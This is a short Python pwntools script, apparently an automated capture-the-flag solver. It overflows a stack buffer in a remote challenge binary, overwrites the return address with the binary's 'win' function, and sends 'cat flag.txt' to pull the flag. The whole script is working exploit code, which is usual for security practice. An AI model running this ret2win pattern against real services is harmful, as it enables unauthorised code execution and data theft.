from pwn import *
import detection
import re

context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

# ------------------------------------- #
# exploit(binary: str)                  #
#                                       #
# INPUT:  filename of vulnerable binary #
# OUTPUT: remote flag                   #
# ------------------------------------- #
def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    e = ELF(binary)

    p.recvuntil(b'>>>')

    payload = b''

    payload += cyclic(detection.find_rip_offset(binary))
    payload += p64(e.sym['win'] + 4)

    p.sendline(payload)

    try: # Do we have a shell?
        p.sendline(b'cat flag.txt')
    except: # Probably just printed the flag
        pass

    output = p.recvall(timeout=0.2)

    flag = re.findall(flag_regex, output.decode())
    if flag: # Success
        return flag[0]
    else: # Failure
        return
